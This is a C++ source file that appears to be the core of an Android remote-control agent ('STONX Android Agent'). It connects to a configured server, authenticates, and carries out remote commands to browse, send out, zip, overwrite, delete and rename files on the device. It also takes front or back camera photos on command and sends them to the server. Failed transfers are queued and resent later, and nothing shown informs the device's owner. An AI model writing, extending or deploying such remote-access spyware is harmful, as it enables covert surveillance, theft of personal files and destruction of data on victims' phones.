#include "stonx_core.hpp"
#include "stonx_protocol.hpp"
#include "config.hpp"
#include "file_ops.hpp"
#include "smart_sync.hpp"
#include "transfer_engine.hpp"
//#include "video_ops.hpp"
#include "pending_queue.hpp"

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/stat.h>
#include <chrono>
#include <thread>
#include <cstring>
#include <android/log.h>
#include <string>
#include <vector>
#include <algorithm>

#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,  "STONX_CORE", __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, "STONX_CORE", __VA_ARGS__)

using namespace StonxProto;

// ── forward decl من stonx_jni.cpp ────────────────────────────────────────
extern void jni_start_camera_capture(const std::string& facing,
                                     const std::string& out_path,
                                     const std::string& op_id,
                                     std::function<void(bool, std::string)> listener);

// ── ctor/dtor ─────────────────────────────────────────────────────────────
StonxCore::StonxCore(const std::string& files_dir,
                     const std::string& host,
                     uint16_t           port,
                     const std::string& psk,
                     Callbacks          cbs)
    : m_files_dir(files_dir), m_host(host), m_port(port),
      m_psk(psk), m_cbs(std::move(cbs)) {}

StonxCore::~StonxCore() { stop(); }

void StonxCore::start() {
    if (m_running.exchange(true)) return;
    m_thread = std::thread(&StonxCore::run_loop, this);
}

void StonxCore::stop() {
    m_running.store(false);
    int fd = m_fd.load();
    if (fd >= 0) { ::shutdown(fd, SHUT_RDWR); }
    if (m_thread.joinable()) m_thread.join();
}

bool StonxCore::is_running() const { return m_running.load(); }

// ── on_camera_result (يُستدعى من JNI) ────────────────────────────────────
void StonxCore::on_camera_result(const std::string& op_id,
                                  bool success,
                                  const std::string& path_or_error) {
    CameraCallback cb;
    {
        std::lock_guard<std::mutex> lock(m_cam_mutex);
        auto it = m_cam_listeners.find(op_id);
        if (it != m_cam_listeners.end()) {
            cb = std::move(it->second);
            m_cam_listeners.erase(it);
        }
    }
    if (cb) {
        cb(success, path_or_error);
    } else {
        LOGE("on_camera_result: no listener for op=%s", op_id.c_str());
    }
}

// ── Main loop ──────────────────────────────────────────────────────────────
void StonxCore::run_loop() {
    log("StonxCore started — target " + m_host + ":" + std::to_string(m_port));
    int attempt = 0;
    while (m_running.load()) {
        try {
            connect_once();
            attempt = 0;
        } catch (const std::exception& e) {
            log(std::string("connection error: ") + e.what());
        }
        notify_connection(false);
        if (!m_running.load()) break;
        int delay = backoff_sec(attempt++);
        log("reconnect in " + std::to_string(delay) + "s");
        for (int i = 0; i < delay * 10 && m_running.load(); ++i)
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    log("StonxCore stopped");
}

// ── TCP Connection ─────────────────────────────────────────────────────────
void StonxCore::connect_once() {
    int fd = ::socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) throw std::runtime_error("socket() failed");

    int yes = 1;
    setsockopt(fd, SOL_SOCKET,  SO_KEEPALIVE, &yes, sizeof(yes));
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY,  &yes, sizeof(yes));

    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(m_port);
    if (inet_pton(AF_INET, m_host.c_str(), &addr.sin_addr) != 1) {
        ::close(fd);
        throw std::runtime_error("invalid IP: " + m_host);
    }

    struct timeval tv = { Config::CONNECTION_TIMEOUT_SEC, 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (::connect(fd, (sockaddr*)&addr, sizeof(addr)) < 0) {
        ::close(fd);
        throw std::runtime_error("connect() failed");
    }

    tv = {0, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    m_fd.store(fd);
    log("TCP connected to " + m_host);

    try {
        do_auth(fd);
        notify_connection(true);

        auto pending = PendingQueue::list_pending(m_files_dir + "/" + Config::PENDING_SUBDIR);
        for (auto& item : pending) {
            if (!m_running.load()) break;
            log("sending pending: " + item.remote_name);
            std::atomic<bool> cancel{false};
            auto result = transfer_send(fd, item.id, item.local_path, item.remote_name,
                                        m_files_dir + "/" + Config::PROGRESS_SUBDIR,
                                        cancel, nullptr);
            if (result == TransferResult::OK) {
                PendingQueue::remove_item(m_files_dir + "/" + Config::PENDING_SUBDIR, item.id);
                log("pending sent OK: " + item.remote_name);
            }
        }
        notify_op_end("pending", true);

        handle_commands(fd);
    } catch (...) {
        m_fd.store(-1);
        ::close(fd);
        throw;
    }

    m_fd.store(-1);
    ::close(fd);
}

// ── Authentication ─────────────────────────────────────────────────────────
void StonxCore::do_auth(int fd) {
    auto hello = build_hello("android-" + std::to_string(getpid()),
                              "STONX Android Agent");
    if (write_frame(fd, hello) != IOResult::OK)
        throw std::runtime_error("HELLO send failed");

    std::string json;
    if (read_frame(fd, json, Config::AUTH_TIMEOUT_SEC) != IOResult::OK)
        throw std::runtime_error("CHALLENGE recv failed");
    if (json_get_str(json, "type") != "CHALLENGE")
        throw std::runtime_error("expected CHALLENGE, got: " + json_get_str(json, "type"));

    std::string nonce = json_get_str(json, "nonce");
    int64_t ts        = json_get_int(json, "timestamp");

    auto auth = build_auth_response(nonce, ts, m_psk);
    if (write_frame(fd, auth) != IOResult::OK)
        throw std::runtime_error("AUTH send failed");

    if (read_frame(fd, json, Config::AUTH_TIMEOUT_SEC) != IOResult::OK)
        throw std::runtime_error("AUTH_OK recv failed");
    if (json_get_str(json, "type") != "AUTH_OK")
        throw std::runtime_error("auth rejected: " + json_get_str(json, "errorCode"));

    log("authenticated OK");
}

// ── Command loop ───────────────────────────────────────────────────────────
void StonxCore::handle_commands(int fd) {
    auto last_ping = std::chrono::steady_clock::now();

    while (m_running.load()) {
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_ping).count()
                >= Config::HEARTBEAT_INTERVAL_SEC) {
            if (write_frame(fd, build_ping()) != IOResult::OK)
                throw std::runtime_error("ping send failed");
            last_ping = now;
        }

        std::string json;
        auto res = read_frame(fd, json, 5);
        if (res == IOResult::TIMEOUT)    continue;
        if (res != IOResult::OK)         throw std::runtime_error("read failed");

        std::string type = json_get_str(json, "type");
        if (type == "PONG" || type == "PING") {
            if (type == "PING") write_frame(fd, build_ping());
            last_ping = std::chrono::steady_clock::now();
            continue;
        }
        if (type == "COMMAND") {
            handle_command(fd, json);
        }
    }
}

void StonxCore::handle_command(int fd, const std::string& json) {
    std::string cmd   = json_get_str(json, "command");
    std::string op_id = json_get_str(json, "operationId");
    log("CMD: " + cmd + " op=" + op_id);

    if      (cmd == "ls")            cmd_ls(fd, op_id, json);
    else if (cmd == "download")      cmd_download(fd, op_id, json);
    else if (cmd == "sync")          cmd_sync(fd, op_id, json);
    else if (cmd == "upload")        cmd_upload(fd, op_id, json);
    else if (cmd == "delete-file")   cmd_delete_file(fd, op_id, json);
    else if (cmd == "delete-folder") cmd_delete_folder(fd, op_id, json);
    else if (cmd == "rename")        cmd_rename(fd, op_id, json);
    else if (cmd == "front-photo")   cmd_front_photo(fd, op_id);
    else if (cmd == "back-photo")    cmd_back_photo(fd, op_id);
    else if (cmd == "front-video")   cmd_front_video(fd, op_id, (int)json_get_int(json,"duration",30));
    else if (cmd == "back-video")    cmd_back_video(fd, op_id, (int)json_get_int(json,"duration",30));
    else {
        write_frame(fd, build_response_error(cmd, op_id, "UNKNOWN_COMMAND"));
        log("unknown command: " + cmd);
    }
}

// ── cmd_ls ────────────────────────────────────────────────────────────────
void StonxCore::cmd_ls(int fd, const std::string& op_id, const std::string& json) {
    std::string raw_path = json_get_str(json, "path");
    std::string real     = FileOps::resolve_path(raw_path);

    if (real.empty()) {
        write_frame(fd, build_response_error("ls", op_id, "INVALID_PATH"));
        return;
    }

    auto result = FileOps::list_dir(real);
    std::string display = raw_path.empty() ? "/" : raw_path;
    write_frame(fd, build_response_ok("ls", op_id,
                FileOps::list_to_json(result, display)));
}

// ── cmd_download ──────────────────────────────────────────────────────────
void StonxCore::cmd_download(int fd, const std::string& op_id, const std::string& json) {
    std::string raw_path = json_get_str(json, "path");
    std::string real     = FileOps::resolve_path(raw_path);

    if (real.empty()) {
        write_frame(fd, build_response_error("download", op_id, "INVALID_PATH"));
        return;
    }

    notify_op_start("download", raw_path);

    struct stat st{};
    if (::stat(real.c_str(), &st) == 0 && S_ISDIR(st.st_mode)) {
        write_frame(fd, build_response_error("download", op_id, "IS_DIRECTORY_USE_SYNC"));
        notify_op_end("download", false);
        return;
    }

    size_t sl = real.rfind('/');
    std::string fname = (sl != std::string::npos) ? real.substr(sl+1) : real;
    std::string prog  = m_files_dir + "/" + Config::PROGRESS_SUBDIR;
    FileOps::make_dirs(prog);

    {
        const char Q = '"';
        std::string pl = std::string("{") +
            Q+"status"+Q+":"+Q+"starting"+Q+"," +
            Q+"file"  +Q+":"+Q+fname    +Q+"}";
        write_frame(fd, build_response_ok("download", op_id, pl));
    }

    std::atomic<bool> cancel{false};
    auto r = transfer_send(fd, new_transfer_id(), real, fname, prog, cancel, nullptr);
    notify_op_end("download", r == TransferResult::OK);
}

// ── cmd_sync ──────────────────────────────────────────────────────────────
void StonxCore::cmd_sync(int fd, const std::string& op_id, const std::string& json) {
    std::string raw_path = json_get_str(json, "path");
    std::string real     = FileOps::resolve_path(raw_path);

    if (real.empty()) {
        write_frame(fd, build_response_error("sync", op_id, "INVALID_PATH"));
        return;
    }

    notify_op_start("sync", raw_path);

    auto manifest = SmartSync::build_manifest(real);
    std::string manifest_json = SmartSync::manifest_to_json(manifest, real);

    write_frame(fd, build_response_ok("sync", op_id, manifest_json));

    std::string req_json;
    if (read_frame(fd, req_json, 60) != IOResult::OK) {
        notify_op_end("sync", false); return;
    }

    std::string files_needed = json_get_str(req_json, "files");
    bool full_sync = (files_needed == "ALL" || files_needed.empty());
    std::string prog = m_files_dir + "/" + Config::PROGRESS_SUBDIR;
    FileOps::make_dirs(prog);

    if (full_sync) {
        std::string tmp_zip = m_files_dir + "/" + Config::TEMP_SUBDIR + "/sync.zip";
        FileOps::make_dirs(m_files_dir + "/" + Config::TEMP_SUBDIR);
        std::string err;
        if (!SmartSync::zip_folder(real, tmp_zip, err)) {
            write_frame(fd, build_response_error("sync", op_id, "ZIP_FAILED"));
            notify_op_end("sync", false); return;
        }
        size_t sl = real.rfind('/');
        std::string dname = (sl != std::string::npos) ? real.substr(sl+1) : "folder";
        std::atomic<bool> cancel{false};
        auto r = transfer_send(fd, new_transfer_id(), tmp_zip, dname+".zip", prog, cancel, nullptr);
        ::unlink(tmp_zip.c_str());
        notify_op_end("sync", r == TransferResult::OK);
    } else {
        std::string flist = files_needed;
        bool all_ok = true;
        while (!flist.empty()) {
            size_t comma = flist.find(',');
            std::string rel = (comma != std::string::npos) ? flist.substr(0, comma) : flist;
            if (!rel.empty()) {
                std::atomic<bool> cancel{false};
                auto r = transfer_send(fd, new_transfer_id(),
                    real + "/" + rel, rel, prog, cancel, nullptr);
                if (r != TransferResult::OK) all_ok = false;
            }
            if (comma == std::string::npos) break;
            flist = flist.substr(comma+1);
        }
        notify_op_end("sync", all_ok);
    }
}

// ── cmd_upload ────────────────────────────────────────────────────────────
void StonxCore::cmd_upload(int fd, const std::string& op_id, const std::string& json) {
    std::string raw_path = json_get_str(json, "remotePath");

    std::string real;
    if (raw_path.empty() || raw_path == "." || raw_path == "/") {
        real = std::string("/storage/emulated/0/STONX_Uploads");
    } else {
        real = FileOps::resolve_path(raw_path);
    }

    if (real.empty()) {
        write_frame(fd, build_response_error("upload", op_id, "INVALID_PATH"));
        return;
    }

    size_t sl = real.rfind('/');
    std::string dir = (sl != std::string::npos) ? real.substr(0,sl) : real;
    FileOps::make_dirs(dir);
    notify_op_start("upload", raw_path);

    {
        const char Q = '"';
        std::string pl = std::string("{") +
            Q+"status"+Q+":"+Q+"ready"+Q+"}";
        write_frame(fd, build_response_ok("upload", op_id, pl));
    }

    std::string prog = m_files_dir + "/" + Config::PROGRESS_SUBDIR;
    FileOps::make_dirs(prog);
    std::atomic<bool> cancel{false};
    auto r = transfer_recv(fd, real, prog, cancel, nullptr);
    notify_op_end("upload", r == TransferResult::OK);
}

// ── cmd_delete_file ───────────────────────────────────────────────────────
void StonxCore::cmd_delete_file(int fd, const std::string& op_id, const std::string& json) {
    std::string raw_path = json_get_str(json, "path");
    std::string real     = FileOps::resolve_path(raw_path);

    if (real.empty()) {
        write_frame(fd, build_response_error("delete-file", op_id, "INVALID_PATH"));
        return;
    }

    std::string err;
    if (FileOps::delete_file(real, err))
        write_frame(fd, build_response_ok("delete-file", op_id, "{}"));
    else
        write_frame(fd, build_response_error("delete-file", op_id, "DELETE_FAILED"));
}

// ── cmd_delete_folder ─────────────────────────────────────────────────────
void StonxCore::cmd_delete_folder(int fd, const std::string& op_id, const std::string& json) {
    std::string raw_path = json_get_str(json, "path");
    std::string real     = FileOps::resolve_path(raw_path);

    if (real.empty()) {
        write_frame(fd, build_response_error("delete-folder", op_id, "INVALID_PATH"));
        return;
    }

    std::string err;
    if (FileOps::delete_folder(real, err))
        write_frame(fd, build_response_ok("delete-folder", op_id, "{}"));
    else
        write_frame(fd, build_response_error("delete-folder", op_id, "DELETE_FAILED"));
}

// ── cmd_rename ────────────────────────────────────────────────────────────
void StonxCore::cmd_rename(int fd, const std::string& op_id, const std::string& json) {
    std::string raw_old = json_get_str(json, "oldPath");
    std::string raw_new = json_get_str(json, "newPath");
    std::string real_old = FileOps::resolve_path(raw_old);
    std::string real_new = FileOps::resolve_path(raw_new);

    if (real_old.empty() || real_new.empty()) {
        write_frame(fd, build_response_error("rename", op_id, "INVALID_PATH"));
        return;
    }

    std::string err;
    if (FileOps::rename_entry(real_old, real_new, err))
        write_frame(fd, build_response_ok("rename", op_id, "{}"));
    else
        write_frame(fd, build_response_error("rename", op_id, "RENAME_FAILED"));
}

// ══════════════════════════════════════════════════════════════════════════
//  Camera handlers — تستخدم JNI بدل CameraOps
// ══════════════════════════════════════════════════════════════════════════

void StonxCore::cmd_front_photo(int fd, const std::string& op_id) {
    notify_op_start("camera", "front-photo");
    std::string tmp_dir     = m_files_dir + "/" + Config::TEMP_SUBDIR;
    std::string prog_dir    = m_files_dir + "/" + Config::PROGRESS_SUBDIR;
    std::string pending_dir = m_files_dir + "/" + Config::PENDING_SUBDIR;
    FileOps::make_dirs(tmp_dir);
    FileOps::make_dirs(prog_dir);
    FileOps::make_dirs(pending_dir);

    auto ts = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    std::string out_path = tmp_dir + "/stonx_" + std::to_string(ts) + ".jpg";

    // ✅ سجّل listener في StonxCore
    {
        std::lock_guard<std::mutex> lock(m_cam_mutex);
        m_cam_listeners[op_id] =
            [this, fd, op_id, prog_dir, pending_dir]
            (bool success, const std::string& val) {
                if (!success) {
                    std::string err = val.empty() ? "CAPTURE_FAILED" : val;
                    write_frame(fd, build_response_error("front-photo", op_id, err));
                    notify_op_end("camera", false);
                    return;
                }
                write_frame(fd, build_response_ok("front-photo", op_id,
                    "{\"status\":\"captured\"}"));
                std::atomic<bool> cancel{false};
                auto r = transfer_send(fd, new_transfer_id(),
                    val, "front_photo.jpg", prog_dir, cancel, nullptr);
                if (r == TransferResult::OK)
                    { ::unlink(val.c_str()); notify_op_end("camera", true); }
                else
                    { PendingQueue::move_to_queue(pending_dir, val, "front_photo.jpg", "photo");
                      notify_op_end("camera", false); }
            };
    }

    // ✅ ابدأ الالتقاط عبر JNI
    jni_start_camera_capture("front", out_path, op_id, nullptr);
}

void StonxCore::cmd_back_photo(int fd, const std::string& op_id) {
    notify_op_start("camera", "back-photo");
    std::string tmp_dir     = m_files_dir + "/" + Config::TEMP_SUBDIR;
    std::string prog_dir    = m_files_dir + "/" + Config::PROGRESS_SUBDIR;
    std::string pending_dir = m_files_dir + "/" + Config::PENDING_SUBDIR;
    FileOps::make_dirs(tmp_dir);
    FileOps::make_dirs(prog_dir);
    FileOps::make_dirs(pending_dir);

    auto ts = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    std::string out_path = tmp_dir + "/stonx_" + std::to_string(ts) + ".jpg";

    {
        std::lock_guard<std::mutex> lock(m_cam_mutex);
        m_cam_listeners[op_id] =
            [this, fd, op_id, prog_dir, pending_dir]
            (bool success, const std::string& val) {
                if (!success) {
                    std::string err = val.empty() ? "CAPTURE_FAILED" : val;
                    write_frame(fd, build_response_error("back-photo", op_id, err));
                    notify_op_end("camera", false);
                    return;
                }
                write_frame(fd, build_response_ok("back-photo", op_id,
                    "{\"status\":\"captured\"}"));
                std::atomic<bool> cancel{false};
                auto r = transfer_send(fd, new_transfer_id(),
                    val, "back_photo.jpg", prog_dir, cancel, nullptr);
                if (r == TransferResult::OK)
                    { ::unlink(val.c_str()); notify_op_end("camera", true); }
                else
                    { PendingQueue::move_to_queue(pending_dir, val, "back_photo.jpg", "photo");
                      notify_op_end("camera", false); }
            };
    }

    jni_start_camera_capture("back", out_path, op_id, nullptr);
}

// ══════════════════════════════════════════════════════════════════════════
//  Video handlers — تستخدم VideoOps (NDK) مؤقتاً
// ══════════════════════════════════════════════════════════════════════════
void StonxCore::cmd_front_video(int fd, const std::string& op_id, int dur) {
    (void)dur;
    write_frame(fd, build_response_error("front-video", op_id, "VIDEO_NOT_IMPLEMENTED"));
    notify_op_end("video", false);
}

void StonxCore::cmd_back_video(int fd, const std::string& op_id, int dur) {
    (void)dur;
    write_frame(fd, build_response_error("back-video", op_id, "VIDEO_NOT_IMPLEMENTED"));
    notify_op_end("video", false);
}
// ── helpers ───────────────────────────────────────────────────────────────
void StonxCore::log(const std::string& msg) {
    LOGI("%s", msg.c_str());
    if (m_cbs.on_log) m_cbs.on_log(msg);
}
void StonxCore::notify_connection(bool c) {
    if (m_cbs.on_connection_changed) m_cbs.on_connection_changed(c);
}
void StonxCore::notify_op_start(const std::string& t, const std::string& d) {
    if (m_cbs.on_op_start) m_cbs.on_op_start(t, d);
}
void StonxCore::notify_op_end(const std::string& t, bool ok) {
    if (m_cbs.on_op_end) m_cbs.on_op_end(t, ok);
}
int StonxCore::backoff_sec(int attempt) {
    int d = Config::RECONNECT_MIN_DELAY_SEC << std::min(attempt, 7);
    return std::min(d, Config::RECONNECT_MAX_DELAY_SEC);
}
